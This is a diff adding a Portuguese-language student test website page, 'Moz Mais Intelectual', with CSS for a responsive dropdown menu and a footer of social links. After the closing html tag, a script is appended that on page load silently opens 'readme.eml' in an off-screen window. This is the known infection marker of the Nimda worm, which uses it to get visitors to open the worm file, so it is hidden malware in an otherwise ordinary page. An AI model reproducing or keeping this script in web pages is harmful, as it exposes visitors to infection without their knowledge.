@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">text/css
+	<title>Project One-Two</title>
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style type="text/css">
+        *{
+    margin: 0;
+    padding: 0;
+    background-color: #4a4a4a;
+}
+
+#titulo {
+    display: none;
+}
+
+#menu {
+    width: 100%;
+    height: 50px;
+    background-color: #4a4a4a;
+    font-family: 'Arial';
+    
+}
+#menu h1 {
+    display: none;
+}
+
+#menu ul {
+    list-style: none;
+    position: relative;
+}
+
+#menu ul li{
+    width: 150px;
+    float: left;
+}
+
+#menu a{
+    color: #fff;
+    padding: 15px;
+    display: block;
+    text-decoration: none;
+    text-align: center;
+    background-color: #4a4a4a;
+    font-size: 11pt;
+}
+
+#menu ul ul{
+    position: absolute;
+    visibility: hidden;
+}
+
+#menu ul li:hover ul{
+    visibility: visible;
+    
+    
+}
+
+#menu a:hover{
+    background-color: #fff;
+    color: #444;
+}
+
+#menu ul ul li{
+    float: none;
+    border-bottom: solid 1px #fff;
+    
+}
+#menu ul ul li a{
+    color: #444;
+    background-color: #ddd;
+}
+
+/*config. dos SubMenus*/
+#menu ul li ul li:hover a{
+    color: #444
+}
+
+/*COnfig. do botão menu (Quando estiver abaixo dos 800px)*/
+label[for="bt_menu"]{
+    padding: 3px;
+    color: #fff;
+    background-color: #4a4a4a;
+    font-family: 'Arial';
+    text-align: center;
+    font-size: 30px;
+    top: 0;
+    width: 40px;
+    height: 40px;
+   
+}
+#bt_menu {
+    display: none;
+}
+label[for="bt_menu"]{
+    display: none;
+}
+
+
+
+/*Config. quando estiver abaixo dos 801px*/
+@media(max-width: 800px){
+    
+    label[for="bt_menu"]{
+        display: block;
+        position: fixed;
+        
+    }
+    #titulo {
+    display: inherit;
+    margin-left: 35%;
+}
+    #bt_menu:checked ~ #menu{
+        margin-top: 41px;
+        position: fixed;
+    }
+    #menu{
+        margin-top: 5px;
+        margin-top: -100%;
+        transition: all .5s;
+    }
+    #menu ul li{
+        width: 100%;
+        float: none;
+        border-bottom: solid 0.8px #fff;
+    }
+    #menu ul ul{
+        position: static;
+        overflow: hidden;
+        max-height: 0;
+        transition: all .3s;
+    }
+    #menu ul li:hover ul {
+        height: auto;
+        max-height: 200px;
+    }
+}
+
+/*corpo*/
+#corpo{
+    height: 2000px;
+}
+
+#imagem{
+    width: 20%;
+    height: 10%;
+}
+
+/*rodape*/
+#rodape {
+   position: relative;
+   bottom: 0;
+   font-family: 'Arial';
+}
+
+#rodape p{
+    height: 17%;   
+    text-align: center;
+    background-color: #4a4a4a;
+    width: 100%;
+    color: #fff;
+}
+
+#rodape p a{
+    background-color: #4a4a4a;
+    color: #fff;
+    text-decoration: none;
+}
+
+#rodape p a:hover{
+    background-color: #fff;
+    color: #444;
+}
+    </style>
+</head>
+<body>
+    <div>
+        <h1 id="titulo">Site Teste</h1>
+    <input type="checkbox" id="bt_menu">
+    <label for="bt_menu">&#9776;</label>
+		<nav id="menu">
+                    <h1> <a href="#">Moz Mais Intelectual</a></h1>
+                    <ul>
+			<li><a href="#">Início</a></li>
+			<li><a href="#">Palestras</a>
+                            <ul>
+                                <li><a href="http://localhost/php/aula5/funcoesaritmeticas.php" target="_blank">#####</a></li>
+                                <li><a href="#">####</a></li>
+                                <li><a href="#">####</a></li>
+                            </ul>
+                        </li>
+			<li><a href="#">Debates</a>
+                            <ul>
+                                <li><a href="fotos.html">2017</a></li>
+                                <li><a href="#">2016</a></li>
+                                <li><a href="#">2015</a></li>
+                            </ul>
+                        </li>
+			<li><a href="#">Feiras</a>
+                            <ul>
+                                <li><a href="#">######</a></li>
+                                <li><a href="#">######</a></li>
+                            </ul>
+                        </li>
+			<li><a href="#">Sobre</a></li>
+		</ul>
+                </nav>
+    
+</div>
+    <div id="corpo">
+       
+    </div>
+    
+<div id="rodape">		
+
+    <p>POWERED BY TADEU MELEMBE<br><a href="https://www.facebook.com/tadeumelembe" target="_blank">Facebook</a> / <a href="https://twitter.com/TMelembe" target="_blank">Twitter</a> / <a href="https://www.instagram.com/tadeumelembe/" target="_blank">Instagram</a></p> 
+</div>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>
